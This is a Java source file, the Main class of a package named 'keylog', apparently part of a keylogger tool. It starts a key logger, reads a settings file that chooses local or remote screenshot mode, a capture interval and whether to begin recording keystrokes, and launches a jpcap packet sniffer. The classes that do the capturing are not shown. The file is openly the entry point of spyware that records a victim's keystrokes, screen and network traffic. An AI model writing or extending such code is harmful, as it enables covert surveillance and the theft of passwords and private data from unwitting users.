package keylog;

import java.io.IOException;
import java.util.StringTokenizer;

import jpcap.PacketReceiver;
import jpcap.packet.Packet;

import io.File;
import debug.DebugSettings;
import static debug.DebugSettings.debug;
import network.*;
public class Main implements PacketReceiver{
	
	private static KeyLogger Keylogger;
	
	public static void main(String args[]){
		
		DebugSettings.SetDebugMode(true);
		
		Keylogger = new KeyLogger();
		Keylogger.StartListening();		//call the main keylogger functions
		ReadSettings();
		
		try {
			PacketSniffer.Main();		//call the packet sniffer to capture packets
		}//try
		catch (IOException e) {
			
			e.printStackTrace();
		}//catch


		
	}//main
	
	public static KeyLogger GetKeyLogger(){return Keylogger;}
	public static void SetKeyLogger(KeyLogger k){Keylogger = k;}
	
	public static void ReadSettings(){
		File f = new File("conf");
		if (f.Exists()){
			String settings = f.Read();
			StringTokenizer st = new StringTokenizer(settings,"#");
			String Local = st.nextToken();
			
			int time = Integer.parseInt(st.nextToken());
			
			String Screen = st.nextToken();
			String KeyCapture = st.nextToken();
			KeyCapture = KeyCapture.substring(0,KeyCapture.length()-1);
			
			if (Local.equals("Local"))
				Keylogger.SetScreenshotMode(KeyLogger.MODE_LOCAL);
			else
				Keylogger.SetScreenshotMode(KeyLogger.MODE_REMOTE);
			
			
			Keylogger.SetScreenshotInterval(time);
			
			if (Screen.equals("3")){
				Keylogger.SetScreenshotMode(KeyLogger.SCREEN_MODE_ON);
				Keylogger.SetScreenshotInterval(time);
				Keylogger.StartScreenCapturing();
			}
			else if (Screen.equals("4")){
				Keylogger.SetScreenshotMode(KeyLogger.SCREEN_MODE_OFF);
			}
			else
				debug("Other Screen Mode:(mistake here) "+Screen);
			
			if (KeyCapture.equals("true")){
				Keylogger.StartSession();
				debug("Started session from Settings");
			}
			else if (KeyCapture.equals("false")){
				debug("Session won't start according to Settings");
			}
			else
				debug("Other KeyCapture mode (mistake here):"+KeyCapture);
			
		}//if exists
		else{
			debug("No settings were saved");
		}//else
	}//ReadSettings

	@Override
	public void receivePacket(Packet arg0) {
		System.out.println(arg0);
	}
	
	
}//Main